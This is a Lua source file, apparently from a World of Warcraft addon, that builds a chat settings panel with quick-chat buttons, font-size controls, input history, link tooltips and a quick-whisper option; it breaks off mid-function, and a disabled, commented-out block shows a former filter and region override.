local addonName, addonTable = ...;
local L=addonTable.locale
local gsub = _G.string.gsub
local match = _G.string.match
local _, _, _, tocversion = GetBuildInfo()
local Fun=addonTable.Fun
--------------
local Create=addonTable.Create
local PIGFrame=Create.PIGFrame
local PIGLine=Create.PIGLine
local PIGButton = Create.PIGButton
local PIGDownMenu=Create.PIGDownMenu
local PIGSlider = Create.PIGSlider
local PIGCheckbutton=Create.PIGCheckbutton
local PIGCheckbutton_R=Create.PIGCheckbutton_R
local PIGOptionsList=Create.PIGOptionsList
local PIGOptionsList_RF=Create.PIGOptionsList_RF
local PIGOptionsList_R=Create.PIGOptionsList_R
local PIGFontString=Create.PIGFontString
local PIGFontStringBG=Create.PIGFontStringBG
local PIGDiyBut=Create.PIGDiyBut
------
local QuickChatfun = {}
addonTable.QuickChatfun=QuickChatfun
--------
local fuFrame = PIGOptionsList(L["CHAT_TABNAME"],"TOP")
--
local DownY=30
local RTabFrame =Create.PIGOptionsList_RF(fuFrame,DownY)
QuickChatfun.RTabFrame=RTabFrame
--
local ChatF,Chattabbut =PIGOptionsList_R(RTabFrame,L["CHAT_TABNAME1"],70)
ChatF:Show()
Chattabbut:Selected()
-------------------------------------------
local QuickChat_maodianID = {1,2};
local QuickChat_maodianListCN = {L["CHAT_QUKBUT_UP"],L["CHAT_QUKBUT_DOWN"]};
local ChatFrame_QuickChat_Open=addonTable.ChatFrame_QuickChat_Open
ChatF.QuickChat = PIGCheckbutton_R(ChatF,{L["CHAT_QUKBUT"],L["CHAT_QUKBUTTIPS"]})
ChatF.QuickChat:SetScript("OnClick", function (self)
	if self:GetChecked() then
		PIGA["Chat"]["QuickChat"]=true;
		QuickChatfun.Open()
	else
		PIGA["Chat"]["QuickChat"]=false;
		Pig_Options_RLtishi_UI:Show()
	end
end);

ChatF.QuickChat.maodian =PIGDownMenu(ChatF.QuickChat,{"LEFT",ChatF.QuickChat.Text,"RIGHT",10,-2},{160,nil})
function ChatF.QuickChat.maodian:PIGDownMenu_Update_But(self)
	local info = {}
	info.func = self.PIGDownMenu_SetValue
	for i=1,#QuickChat_maodianListCN,1 do
	    info.text, info.arg1, info.checked = QuickChat_maodianListCN[i], i, i == PIGA["Chat"]["QuickChat_maodian"]
		ChatF.QuickChat.maodian:PIGDownMenu_AddButton(info)
	end 
end
function ChatF.QuickChat.maodian:PIGDownMenu_SetValue(value,arg1,arg2)
	ChatF.QuickChat.maodian:PIGDownMenu_SetText(value)
	PIGA["Chat"]["QuickChat_maodian"]=arg1
	QuickChatfun.Update_QuickChatPoint(arg1)
	PIGCloseDropDownMenus()
end
---
local QuickChat_style = {L["CHAT_QUKBUT_STYLE"].."1",L["CHAT_QUKBUT_STYLE"].."2"};
ChatF.QuickChat.style =PIGDownMenu(ChatF.QuickChat,{"LEFT",ChatF.QuickChat.maodian,"RIGHT",20,0},{80,nil})
function ChatF.QuickChat.style:PIGDownMenu_Update_But(self)
	local info = {}
	info.func = self.PIGDownMenu_SetValue
	for i=1,#QuickChat_style,1 do
	    info.text, info.arg1, info.checked = QuickChat_style[i], i, i == PIGA["Chat"]["QuickChat_style"]
		ChatF.QuickChat.style:PIGDownMenu_AddButton(info)
	end 
end
function ChatF.QuickChat.style:PIGDownMenu_SetValue(value,arg1,arg2)
	ChatF.QuickChat.style:PIGDownMenu_SetText(value)
	PIGA["Chat"]["QuickChat_style"]=arg1
	Pig_Options_RLtishi_UI:Show()
	PIGCloseDropDownMenus()
end
ChatF.QuickChat.jianyin = PIGCheckbutton(ChatF.QuickChat,{"LEFT", ChatF.QuickChat.style, "RIGHT", 20, 0},{"鼠标离开渐隐","鼠标离开渐隐"})
ChatF.QuickChat.jianyin:SetScript("OnClick", function (self)
	if self:GetChecked() then
		PIGA["Chat"]["QuickChat_jianyin"]=true;
		if QuickChatFFF_UI then QuickChatFFF_UI:PIGLeaveAlpha() end
	else
		PIGA["Chat"]["QuickChat_jianyin"]=false;
		if QuickChatFFF_UI then QuickChatFFF_UI:PIGEnterAlpha() end
	end
end);
for i=1,#L["CHAT_QUKBUTNAME"] do
	local pindaol = PIGCheckbutton(ChatF,nil,{L["CHAT_QUKBUTNAME"][i],nil},nil,"PpindaoQUK_CK"..i,i)
	if i==1 then
		pindaol:SetPoint("TOPLEFT",ChatF.QuickChat,"BOTTOMLEFT",0,-20);
	else
		pindaol:SetPoint("LEFT", _G["PpindaoQUK_CK"..(i-1)], "RIGHT", 30, 0);
	end
	pindaol:SetScript("OnClick", function (self)
		if self:GetChecked() then
			PIGA["Chat"]["QuickChat_ButHide"][L["CHAT_QUKBUTNAME"][i]]=nil;
		else
			PIGA["Chat"]["QuickChat_ButHide"][L["CHAT_QUKBUTNAME"][i]]=true;
		end
		Pig_Options_RLtishi_UI:Show()
	end);
end
local xiayiinfo = {0.8,1.6,0.1,{["Right"]="%"}}
ChatF.QuickChat.Slider = PIGSlider(ChatF.QuickChat,{"TOPLEFT",ChatF.QuickChat,"BOTTOMLEFT",30,-50},xiayiinfo,110)
ChatF.QuickChat.Slider.bt = PIGFontString(ChatF.QuickChat.Slider,{"RIGHT", ChatF.QuickChat.Slider, "LEFT", 0, 0},"缩放")
ChatF.QuickChat.Slider.Slider:HookScript("OnValueChanged", function(self, arg1)
	PIGA["Chat"]["QuickChat_suofang"]=arg1;
	if QuickChatFFF_UI then
		QuickChatFFF_UI:suofang()
	end
end)
--X偏移
local xiayiinfoX = {-200,200,1}
ChatF.QuickChat.SliderX = PIGSlider(ChatF.QuickChat,{"LEFT",ChatF.QuickChat.Slider,"RIGHT",110,0},xiayiinfoX,110)
ChatF.QuickChat.SliderX.bt = PIGFontString(ChatF.QuickChat.SliderX,{"RIGHT", ChatF.QuickChat.SliderX, "LEFT", 0, 0},"X偏移")
ChatF.QuickChat.SliderX.Slider:HookScript("OnValueChanged", function(self, arg1)
	PIGA["Chat"]["QuickChat_pianyiX"]=arg1;
	if QuickChatFFF_UI then
		QuickChatFFF_UI:suofang()
	end
end)
--Y偏移
local xiayiinfoY = {-200,200,1}
ChatF.QuickChat.SliderY = PIGSlider(ChatF.QuickChat,{"LEFT",ChatF.QuickChat.SliderX,"RIGHT",96,0},xiayiinfoY,110)
ChatF.QuickChat.SliderY.bt = PIGFontString(ChatF.QuickChat.SliderY,{"RIGHT", ChatF.QuickChat.SliderY, "LEFT", 0, 0},"Y偏移")
ChatF.QuickChat.SliderY.Slider:HookScript("OnValueChanged", function(self, arg1)
	PIGA["Chat"]["QuickChat_pianyiY"]=arg1;
	if QuickChatFFF_UI then
		QuickChatFFF_UI:suofang()
	end
end)
ChatF:HookScript("OnShow", function (self)
	self.QuickChat:SetChecked(PIGA["Chat"]["QuickChat"])
	self.QuickChat.maodian:PIGDownMenu_SetText(QuickChat_maodianListCN[PIGA["Chat"]["QuickChat_maodian"]])
	self.QuickChat.style:PIGDownMenu_SetText(QuickChat_style[PIGA["Chat"]["QuickChat_style"]])
	self.QuickChat.jianyin:SetChecked(PIGA["Chat"]["QuickChat_jianyin"])
	self.QuickChat.Slider:PIGSetValue(PIGA["Chat"]["QuickChat_suofang"]);
	self.QuickChat.SliderX:PIGSetValue(PIGA["Chat"]["QuickChat_pianyiX"]);
	self.QuickChat.SliderY:PIGSetValue(PIGA["Chat"]["QuickChat_pianyiY"]);
	for i=1,#L["CHAT_QUKBUTNAME"] do
		_G["PpindaoQUK_CK"..i]:SetChecked(not PIGA["Chat"]["QuickChat_ButHide"][L["CHAT_QUKBUTNAME"][i]])
	end
end);
-------
ChatF.SetFrame=PIGFrame(ChatF)
ChatF.SetFrame:PIGSetBackdrop(0)
ChatF.SetFrame:SetPoint("TOPLEFT",ChatF,"TOPLEFT",0,-140);
ChatF.SetFrame:SetPoint("BOTTOMRIGHT",ChatF,"BOTTOMRIGHT",0,50);
--（关闭语言过滤器）
local function guanbiGuolv()
	--if PIGA["Chat"]["Guolv"] then return end
	-- if not PIGA["Chat"]["Guolv"] then return end
	-- if GetLocale() ~= "zhCN" then return end
	-- if GetCVar("portal") == "CN" then
	-- 	ConsoleExec("portal TW")
	-- end
	-- SetCVar("profanityFilter", "0")
	-- if tocversion>90000 then
	-- 	local Old_fun = C_BattleNet.GetFriendGameAccountInfo
	-- 	C_BattleNet.GetFriendGameAccountInfo = function(...)
	-- 		local gameAccountInfo = Old_fun(...)
	-- 		gameAccountInfo.isInCurrentRegion = true
	-- 		return gameAccountInfo;
	-- 	end
	-- else
	-- 	local OLD_BNGetFriendInfo = BNGetFriendInfo
	-- 	BNGetFriendInfo = function(...)
	-- 		local bnetIDAccount, accountName, battleTag, isBattleTagPresence, characterName, bnetIDGameAccount, client, isOnline, lastOnline, isAFK, isDND, messageText, noteText, isRIDFriend, messageTime, canSoR, isReferAFriend, canSummonFriend = OLD_BNGetFriendInfo(...)
	-- 		local canSummonFriend = true
	-- 		return bnetIDAccount, accountName, battleTag, isBattleTagPresence, characterName, bnetIDGameAccount, client, isOnline, lastOnline, isAFK, isDND, messageText, noteText, isRIDFriend, messageTime, canSoR, isReferAFriend, canSummonFriend;
	-- 	end
	-- end
	-- HelpFrame.guanbiguolvqi=PIGButton(HelpFrame,{"TOPRIGHT", HelpFrame, "TOPRIGHT", -50, -0.6},{280,19},"无法访问点这里然后重新登录游戏")
	-- HelpFrame.guanbiguolvqi:SetFrameLevel(510)
	-- HelpFrame.guanbiguolvqi:SetScript("OnClick", function (self)
	-- 	PIGA["Chat"]["Guolv"]=false
	-- 	self:SetText("请退出游戏重新登录")
	-- 	self:Disable()
	-- end);
end
if GetLocale() == "zhCN" then
	--/console SET portal "TW"    /console SET profanityFilter "0" 
	---------------------
	-- ChatF.SetFrame.Guolv = PIGCheckbutton_R(ChatF.SetFrame,{"强制关闭语言过滤器","强制关闭系统选项中无法设置的语言过滤器"})
	-- ChatF.SetFrame.Guolv:SetScript("OnClick", function (self)
	-- 	if self:GetChecked() then
	-- 		PIGA["Chat"]["Guolv"]=true;
	-- 	else
	-- 		PIGA["Chat"]["Guolv"]=false;
	-- 	end
	-- 	guanbiGuolv()
	-- end);
	-- ChatF.SetFrame.Guolv.title1 = PIGFontString(ChatF.SetFrame,{"LEFT", ChatF.SetFrame.Guolv.Text, "RIGHT", 4, 0},"***更改后需重新登录游戏生效***")
	-- ChatF.SetFrame.GuolvNULL=PIGFrame(ChatF.SetFrame)
end
--输入框光标优化
local function ChatFrame_Althistory_Open()
	local ChatHistory = {}
	local ChatHistoryIndex = 0
	for i = 1, NUM_CHAT_WINDOWS do
		local ChatFrame=_G["ChatFrame"..i.."EditBox"]
		hooksecurefunc(ChatFrame, "AddHistoryLine", function(self, msg)
			if ChatFrame:GetAltArrowKeyMode() then return end
			if #ChatHistory>19 then
				for ix=#ChatHistory,20,-1 do
					table.remove(ChatHistory,ix)
				end
			end
			table.insert(ChatHistory,1,msg)
		end)
		ChatFrame:HookScript("OnShow",function()
			if ChatFrame:GetAltArrowKeyMode() then return end
			ChatHistoryIndex = 0
		end)	
		ChatFrame:HookScript("OnKeyDown",function(self,key)
			if key=="UP" or key=="DOWN" then
				if #ChatHistory==0 then return end
				if key=="UP" then
					if ChatHistoryIndex<#ChatHistory then
						ChatHistoryIndex=ChatHistoryIndex+1
					else
						ChatHistoryIndex=1
					end
				elseif key=="DOWN" then
					if ChatHistoryIndex>1 then
						ChatHistoryIndex=ChatHistoryIndex-1
					else
						ChatHistoryIndex = #ChatHistory
					end
				end
				self:SetText(ChatHistory[ChatHistoryIndex])
	        	--self:HighlightText()
			end
		end)
	end
end
ChatFrame_Althistory_Open()
local function ChatFrame_AltEX_Open(onoff)
	local onoff = onoff or PIGA["Chat"]["AltEX"]
	if onoff then
		if ChatFrame1EditBox:GetAltArrowKeyMode() then
			for i = 1, NUM_CHAT_WINDOWS do
				_G["ChatFrame"..i.."EditBox"]:SetAltArrowKeyMode(false) --false只按方向键即可控制输入框光标 
			end
		end
	else
		if not ChatFrame1EditBox:GetAltArrowKeyMode() then
			for i = 1, NUM_CHAT_WINDOWS do
				_G["ChatFrame"..i.."EditBox"]:SetAltArrowKeyMode(true) --
			end
		end
	end
end
-------------------
ChatF.SetFrame.AltEX = PIGCheckbutton_R(ChatF.SetFrame,{L["CHAT_ALTEX"],L["CHAT_ALTEXTIPS"]})
ChatF.SetFrame.AltEX:SetScript("OnClick", function (self)
	if self:GetChecked() then
		PIGA["Chat"]["AltEX"]=true;	
	else
		PIGA["Chat"]["AltEX"]=false;
	end
	ChatFrame_AltEX_Open(PIGA["Chat"]["AltEX"]);
end);

--移除聊天文字渐隐
local function ChatFrame_Jianyin_Open()
	if PIGA["Chat"]["Jianyin"] then
		for i = 1, NUM_CHAT_WINDOWS do
			_G["ChatFrame"..i]:SetFading(false)
		end
	else
		for i = 1, NUM_CHAT_WINDOWS do
			_G["ChatFrame"..i]:SetFading(true) 
		end
	end
end
-------------
ChatF.SetFrame.Jianyin = PIGCheckbutton_R(ChatF.SetFrame,{L["CHAT_JIANYIN"],L["CHAT_JIANYINTIPS"]})
ChatF.SetFrame.Jianyin:SetScript("OnClick", function (self)
	if self:GetChecked() then
		PIGA["Chat"]["Jianyin"]=true;	
	else
		PIGA["Chat"]["Jianyin"]=false;
	end
	ChatFrame_Jianyin_Open();
end);

----鼠标指向链接显示物品属性
local linktypes = {item = true, enchant = true, spell = true, quest = true, unit = true, talent = true, achievement = true, glyph = true}
local function Chat_LinkShow()
	if not PIGA["Chat"]["LinkShow"] then return end
	for i = 1, NUM_CHAT_WINDOWS do
		local frame = _G["ChatFrame"..i]
		frame:HookScript("OnHyperlinkEnter", function (self, linkData, link)
			local linktype = linkData:match("^([^:]+)")
			if linktype and linktypes[linktype] then
				GameTooltip:ClearLines();
				GameTooltip:SetOwner(self, "ANCHOR_CURSOR")
				GameTooltip:SetHyperlink(link)
				GameTooltip:Show()
			end
		end)
		frame:HookScript("OnHyperlinkLeave", function()
			GameTooltip:ClearLines();
			GameTooltip:Hide()
		end)
	end
end
ChatF.SetFrame.LinkShow = PIGCheckbutton_R(ChatF.SetFrame,{L["CHAT_LINKSHOW"],L["CHAT_ZHIXIANGSHOWTIPS"]})
ChatF.SetFrame.LinkShow:SetScript("OnClick", function (self)
	if self:GetChecked() then
		PIGA["Chat"]["LinkShow"]=true;
		Chat_LinkShow()
	else
		PIGA["Chat"]["LinkShow"]=false;
		Pig_Options_RLtishi_UI:Show();
	end
end);

--职业颜色
local function ChatClassColor()
	if PIGA["Chat"]["ClassColor"] then
		SetCVar("chatClassColorOverride", "0")
	else
		SetCVar("chatClassColorOverride", "1")
	end
	local ClassColorV = GetCVar("chatClassColorOverride")
	local channels = {GetChatWindowMessages(1)}
	for id=1,#channels do
		if ClassColorV=="0" then
			SetChatColorNameByClass(channels[id],true)
			--ChatTypeInfo[chatpindao[i]]["colorNameByClass"]=true
		elseif ClassColorV=="1" then
			SetChatColorNameByClass(channels[id],false)
		end	
	end
	for id = 1, MAX_WOW_CHAT_CHANNELS do
		if ClassColorV=="0" then
			SetChatColorNameByClass("CHANNEL"..id,true)
		elseif ClassColorV=="1" then
			SetChatColorNameByClass("CHANNEL"..id,false)
		end	
	end
end
ChatF.SetFrame.ClassColor = PIGCheckbutton_R(ChatF.SetFrame,{L["CHAT_CLASSCOLOR"],L["CHAT_CLASSCOLOR"]})
ChatF.SetFrame.ClassColor:SetScript("OnClick", function (self)
	if self:GetChecked() then
		PIGA["Chat"]["ClassColor"]=true;
	else
		PIGA["Chat"]["ClassColor"]=false;
	end
	ChatClassColor()
end);
--精简频道名
ChatF.SetFrame.jingjian = PIGCheckbutton_R(ChatF.SetFrame,{L["CHAT_JINGJIAN"],L["CHAT_JINGJIANTIPS"]})
ChatF.SetFrame.jingjian:SetScript("OnClick", function (self)
	if self:GetChecked() then
		PIGA["Chat"]["jingjian"]=true;
	else
		PIGA["Chat"]["jingjian"]=false;
	end
end);
---------------------
local function JoinPIG(pindaoName)
	local channel,channelName= GetChannelName(pindaoName)
	if not channelName then
		if channelName=="PIG" then
			JoinTemporaryChannel(pindaoName, nil, DEFAULT_CHAT_FRAME:GetID(), 1);
		else
			JoinPermanentChannel(pindaoName, nil, DEFAULT_CHAT_FRAME:GetID(), 1);
			ChatFrame_AddChannel(DEFAULT_CHAT_FRAME, pindaoName)--订购一个聊天框以显示先前加入的聊天频道
		end
	end
	ChatFrame_RemoveChannel(DEFAULT_CHAT_FRAME, "PIG");
end
local function JoinPIG_D_1(pindaoName,jihuo)
	local chabuts=ChannelFrame.ChannelList.buttons
	for i=1,#chabuts do
		chabuts[i]:Enable()
		chabuts[i].Text:SetTextColor(1, 1, 1, 1);
		if pindaoName==chabuts[i].name then
			if not jihuo then
				chabuts[i]:Disable()
				chabuts[i].Text:SetTextColor(0.5, 0.5, 0.5, 0.5);
			end
		end
	end
end
local function JoinPIG_D(pindaoName)
	hooksecurefunc(ChannelFrame.ChannelList, "Update", function()
		JoinPIG_D_1(pindaoName)
	end)
	local pindaojinzhiPPP = CreateFrame("FRAME")
    pindaojinzhiPPP:RegisterEvent("ADDON_LOADED")
    pindaojinzhiPPP:SetScript("OnEvent", function(self, event, arg1)
        if arg1=="Blizzard_Communities" then
        	self:UnregisterEvent("ADDON_LOADED")
        	ChannelFrame:Hide()
        	ChannelFrame:Show()
		end
	end)
end
local function JoinPIGALL(pindaoName)
	if PIGA["Chat"]["JoinPindao"] then
		JoinPIG(LOOK_FOR_GROUP)
		JoinPIG("PIG")
		JoinPIG_D("PIG")
	end
end
ChatF.SetFrame.JoinPig = PIGCheckbutton_R(ChatF.SetFrame,{L["CHAT_JOINPIG"],L["CHAT_JOINPIGTIPS"]})
ChatF.SetFrame.JoinPig.haoshi=0
ChatF.SetFrame.JoinPig:SetScript("OnClick", function (self)
	if self:GetChecked() then
		PIGA["Chat"]["JoinPindao"]=true;	
	else
		PIGA["Chat"]["JoinPindao"]=false;
	end
	JoinPIGALL()
end);
--设置聊天字体大小--------
local ChatFontSizeList = {12,13,14,15,16,17,18,19,20,21,22,23,24,25,26};
local ChatFont_Min =ChatFontSizeList[1]
local ChatFont_Max =ChatFontSizeList[#ChatFontSizeList]
--增加放大缩小字体按钮
local function MaxMinBUT_icon()
	if ChatFrame1.MinB and ChatFrame1.MaxB then
		ChatFrame1.MaxB:Enable();
		ChatFrame1.MinB:Enable();
		local _,fontSize = GetChatWindowInfo(1);
		if fontSize==ChatFont_Min then
			ChatFrame1.MinB:Disable()
		end
		if fontSize==ChatFont_Max then
			ChatFrame1.MaxB:Disable()
		end
	end
end
local function ChatFrame_WINDOWS_Size(NewSize)
	for id=1,NUM_CHAT_WINDOWS,1 do
		FCF_SetChatWindowFontSize(nil, _G["ChatFrame"..id], NewSize);
	end
	if ChatFrame99 then
		FCF_SetChatWindowFontSize(nil, ChatFrame99, NewSize);
	end
	MaxMinBUT_icon()
end
local function ChatFrame_AutoFontSize_Open()
	if PIGA["Chat"]["FontSize"] then
		ChatFrame_WINDOWS_Size(PIGA["Chat"]["FontSize_value"])
	end
end
ChatF.SetFrame.FontSize = PIGCheckbutton_R(ChatF.SetFrame,{L["CHAT_FONTSIZE"],L["CHAT_FONTSIZETIPS"]})
ChatF.SetFrame.FontSize:SetScript("OnClick", function (self)
	if self:GetChecked() then
		PIGA["Chat"]["FontSize"]=true;
	else
		PIGA["Chat"]["FontSize"]=false;
	end
	ChatFrame_AutoFontSize_Open()
end);
--字号下拉菜单
ChatF.SetFrame.FontSize.Down=PIGDownMenu(ChatF,{"LEFT",ChatF.SetFrame.FontSize.Text,"RIGHT",0,0},{65,nil})
function ChatF.SetFrame.FontSize.Down:PIGDownMenu_Update_But(self)
	local info = {}
	info.func = self.PIGDownMenu_SetValue
	for i=1,#ChatFontSizeList,1 do
	    info.text, info.arg1 = ChatFontSizeList[i].."pt", ChatFontSizeList[i]
	    info.checked = ChatFontSizeList[i]==PIGA["Chat"]["FontSize_value"]
		ChatF.SetFrame.FontSize.Down:PIGDownMenu_AddButton(info)
	end 
end
function ChatF.SetFrame.FontSize.Down:PIGDownMenu_SetValue(value,arg1,arg2)
	ChatF.SetFrame.FontSize.Down:PIGDownMenu_SetText(value)
	PIGA["Chat"]["FontSize_value"]=arg1
	ChatFrame_WINDOWS_Size(arg1)
	PIGCloseDropDownMenus()
end
local function ChatFrame_MinMaxB_Open()
	if not PIGA["Chat"]["MinMaxB"] then return end
	local fff = ChatFrame1
	if fff.MinB then return end
	local wwwhh = 18
	fff.MaxB = PIGButton(UIParent,{"TOPRIGHT",fff.Background,"TOPRIGHT",0,0},{wwwhh,wwwhh},"+"); 
	fff.MaxB:SetBackdropColor(0,0,0,0);
	fff.MaxB:SetBackdropBorderColor(0,0,0,0.4);
	fff.MaxB:SetScript("OnEnter", function(self)
		if self:IsEnabled() then
			self:SetBackdropBorderColor(0, 0.8, 1, 0.9);
		end
	end);
	fff.MaxB:SetScript("OnLeave", function(self)
		if self:IsEnabled() then
			self:SetBackdropBorderColor(0,0,0,0.4);
		end
	end);
	fff.MinB = PIGButton(UIParent,{"RIGHT",fff.MaxB,"LEFT",-2,0},{wwwhh,wwwhh},"-");
	fff.MinB:SetBackdropColor(0,0,0,0); 
	fff.MinB:SetBackdropBorderColor(0,0,0,0.4);
	fff.MinB:SetScript("OnEnter", function(self)
		if self:IsEnabled() then
			self:SetBackdropBorderColor(0, 0.8, 1, 0.9);
		end
	end);
	fff.MinB:SetScript("OnLeave", function(self)
		if self:IsEnabled() then
			self:SetBackdropBorderColor(0,0,0,0.4);
		end
	end);
	MaxMinBUT_icon()
	fff.MinB:SetScript("OnClick", function(self)
		local _,fontSize = GetChatWindowInfo(1);
		if fontSize>ChatFont_Min then
			ChatFrame_WINDOWS_Size(fontSize-1)
			MaxMinBUT_icon()
		end
	end);
	fff.MaxB:SetScript("OnClick", function(self)
		local _,fontSize = GetChatWindowInfo(1);
		if fontSize<ChatFont_Max then
			ChatFrame_WINDOWS_Size(fontSize+1)
			MaxMinBUT_icon()
		end
	end);
end
ChatF.SetFrame.MinMaxB = PIGCheckbutton_R(ChatF.SetFrame,{L["CHAT_MINMAXB"],L["CHAT_MINMAXBTIPS"]})
ChatF.SetFrame.MinMaxB:SetScript("OnClick", function (self)
	if self:GetChecked() then
		PIGA["Chat"]["MinMaxB"]=true;
		ChatFrame_MinMaxB_Open();		
	else
		PIGA["Chat"]["MinMaxB"]=false;
		Pig_Options_RLtishi_UI:Show()
	end
end);
--显示装备图标
ChatF.SetFrame.ShowLinkIcon = PIGCheckbutton_R(ChatF.SetFrame,{"物品链接显示图标","聊天栏发送的物品链接会显示图标"})
ChatF.SetFrame.ShowLinkIcon:SetScript("OnClick", function (self)
	if self:GetChecked() then
		PIGA["Chat"]["ShowLinkIcon"]=true;
	else
		PIGA["Chat"]["ShowLinkIcon"]=false;
	end
end);
--查看远程装备图标
local tishiSHOW = {
	RACE..EMBLEM_SYMBOL.."("..INVTYPE_RANGED..INSPECT.."/"..STATUS_TEXT_TARGET..INFO..")",
	SHOW_PLAYER_NAMES..SHOW..RACE..EMBLEM_SYMBOL.."\n"..KEY_BUTTON1.."-"..INVTYPE_RANGED..INSPECT..STATUS_TEXT_TARGET.."\n"..
	KEY_BUTTON2.."-"..STATUS_TEXT_TARGET..INFO;
}
ChatF.SetFrame.ShowZb = PIGCheckbutton_R(ChatF.SetFrame,tishiSHOW)
ChatF.SetFrame.ShowZb:SetScript("OnClick", function (self)
	if self:GetChecked() then
		PIGA["Chat"]["ShowZb"]=true;
	else
		PIGA["Chat"]["ShowZb"]=false;
	end
end);
---查询页密语
local function WhoWhisper_Fun()
	if not PIGA["Chat"]["WhoWhisper"] then return end
	if WhoFrame.endsenList then return end
	WhoFrame.endsenList={}
	WhoFrame.endsenmsg="随机黑石深渊，来吗？"
	WhoFrame.senmsg = PIGButton(WhoFrame,{"TOPLEFT",WhoFrame,"TOPLEFT",160,-26},{60,26},"密语",nil,nil,nil,nil,0);
	WhoFrame.senmsg:Disable();
	WhoFrame.senmsg:HookScript("OnClick", function(self, button)
		if WhoFrame.selectedWho then
			local info = C_FriendList.GetWhoInfo(WhoFrame.selectedWho);
			SendChatMessage(WhoFrame.endsenmsg, "WHISPER", nil, info.fullName);
			WhoFrame.endsenList[info.fullName]=true
			self:Disable()
		end
	end)
	WhoFrame.senmsg.bianji = PIGDiyBut(WhoFrame.senmsg,{"LEFT",WhoFrame.senmsg,"RIGHT",4,0},{nil,nil,20,22,130781})
	WhoFrame.senmsg.bianji:SetScript("OnClick", function (self)
		if self.F:IsShown() then
			self.F:Hide()
		else
			self.F.NR.E:SetText(WhoFrame.endsenmsg)
			self.F:Show()
		end
	end);
	WhoFrame.senmsg.listUpdate=function(button)
		if button.senmsgFun then return end
		button:HookScript("OnClick", function(self)
			if WhoFrame.selectedWho then
				local NameText = self.Name or self:GetName() and _G[self:GetName().."Name"]:GetText()
				if WhoFrame.endsenList[NameText] then	
					WhoFrame.senmsg:Disable()
				else
					WhoFrame.senmsg:Enable()
				end
			end
		end)
		button.senmsgFun=true
	end
	WhoFrame.senmsg.bianji.F=PIGFrame(WhoFrame.senmsg.bianji,{"TOPLEFT",WhoFrame.senmsg.bianji,"TOPRIGHT",4,0},{300,200})
	WhoFrame.senmsg.bianji.F:PIGSetBackdrop(1,nil,nil,nil,0)
	WhoFrame.senmsg.bianji.F:PIGClose()
	WhoFrame.senmsg.bianji.F:Hide()
	WhoFrame.senmsg.bianji.F.biaoti = PIGFontString(WhoFrame.senmsg.bianji.F,{"TOP", WhoFrame.senmsg.bianji.F, "TOP", 0,-4},"密语内容");
	WhoFrame.senmsg.bianji.F.NR=PIGFrame(WhoFrame.senmsg.bianji.F,{"TOPLEFT", WhoFrame.senmsg.bianji.F, "TOPLEFT", 3,-26})
	WhoFrame.senmsg.bianji.F.NR:SetPoint("BOTTOMRIGHT", WhoFrame.senmsg.bianji.F, "BOTTOMRIGHT", -3,3);
	WhoFrame.senmsg.bianji.F.NR:PIGSetBackdrop(0,0.6,nil,{1, 1, 0})
	WhoFrame.senmsg.bianji.F.NR.E = CreateFrame("EditBox", nil, WhoFrame.senmsg.bianji.F.NR);
	WhoFrame.senmsg.bianji.F.NR.E:SetPoint("TOPLEFT", WhoFrame.senmsg.bianji.F.NR, "TOPLEFT", 2,-2);
	WhoFrame.senmsg.bianji.F.NR.E:SetPoint("BOTTOMRIGHT", WhoFrame.senmsg.bianji.F.NR, "BOTTOMRIGHT", -2,2);
	WhoFrame.senmsg.bianji.F.NR.E:SetFontObject(ChatFontNormal);
	WhoFrame.senmsg.bianji.F.NR.E:SetAutoFocus(false);
	WhoFrame.senmsg.bianji.F.NR.E:SetMultiLine(true)
	WhoFrame.senmsg.bianji.F.NR.E:SetMaxLetters(200);
	WhoFrame.senmsg.bianji.F.NR.E:SetTextColor(0.7, 0.7, 0.7, 0.6);
	WhoFrame.senmsg.bianji.F.NR.E:SetScript("OnEditFocusGained", function(self) 
		self:SetTextColor(1, 1, 1, 1);
	end);
	WhoFrame.senmsg.bianji.F.NR.E:SetScript("OnEditFocusLost", function(self)
		self:SetTextColor(0.7, 0.7, 0.7, 1);
	end);
	WhoFrame.senmsg.bianji.F.NR.E:SetScript("OnEscapePressed", function(self) 
		self:ClearFocus()
	end);
	WhoFrame.senmsg.bianji.F.NR.E:SetScript("OnEnterPressed", function(self) 
		self:ClearFocus()
	end);
	WhoFrame.senmsg.bianji.F.NR.E:SetScript("OnCursorChanged", function(self)
		WhoFrame.endsenmsg=self:GetText();
	end);
end
ChatF.SetFrame.WhoWhisper = PIGCheckbutton_R(ChatF.SetFrame,{"查询页快捷密语","在查询页增加一个快捷密语按钮"})
ChatF.SetFrame.WhoWhisper:SetScript("OnClick", function (self)
	if self:GetChecked() then
		PIGA["Chat"]["WhoWhisper"]=true;
	else
		PIGA["Chat"]["WhoWhisper"]=false;
		Pig_Options_RLtishi_UI:Show()
	end
	WhoWhisper_Fun()
end);
local Copytisp = SHOW_PLAYER_NAMES..SHOW..CALENDAR_COPY_EVENT..EMBLEM_SYMBOL.."\n"..KEY_BUTTON1.."-"..CALENDAR_COPY_EVENT..STATUS_TEXT_TARGET..CALENDAR_PLAYER_NAME.."\n"..KEY_BUTTON2.."-"..CALENDAR_COPY_EVENT..STATUS_TEXT_TARGET..VOICE_TALKING
ChatF.SetFrame.FastCopy = PIGCheckbutton_R(ChatF.SetFrame,{CALENDAR_COPY_EVENT..EMBLEM_SYMBOL.."("..CALENDAR_COPY_EVENT..CALENDAR_PLAYER_NAME.."/"..CALENDAR_COPY_EVENT..VOICE_TALKING..")",Copytisp})
ChatF.SetFrame.FastCopy:SetScript("OnClick", function (self)
	if self:GetChecked() then
		PIGA["Chat"]["FastCopy"]=true;
	else
		PIGA["Chat"]["FastCopy"]=false;
	end
end);
--屏蔽人员进入频道提示
local function RemTips_Fun()
	if PIGA["Chat"]["RemTips"] then
		for i=1,NUM_CHAT_WINDOWS do
			ChatFrame_RemoveMessageGroup(_G["ChatFrame"..i], "CHANNEL")--屏蔽人员进出频道提示
		end
	else
		for i=1,NUM_CHAT_WINDOWS do
			ChatFrame_AddMessageGroup(_G["ChatFrame"..i], "CHANNEL")--屏蔽人员进出频道提示
		end	
	end
end	
ChatF.SetFrame.RemTips = PIGCheckbutton(ChatF.SetFrame,{"BOTTOMLEFT",ChatF,"BOTTOMLEFT",20,18},{"屏蔽人员进出频道提示","屏蔽人员进出频道提示"})
ChatF.SetFrame.RemTips:SetScript("OnClick", function (self)
	if self:GetChecked() then
		PIGA["Chat"]["RemTips"]=true;
	else
		PIGA["Chat"]["RemTips"]=false;
	end
	RemTips_Fun()
end);
ChatF.SetFrame:HookScript("OnShow", function (self)
	-- if GetLocale() == "zhCN" then
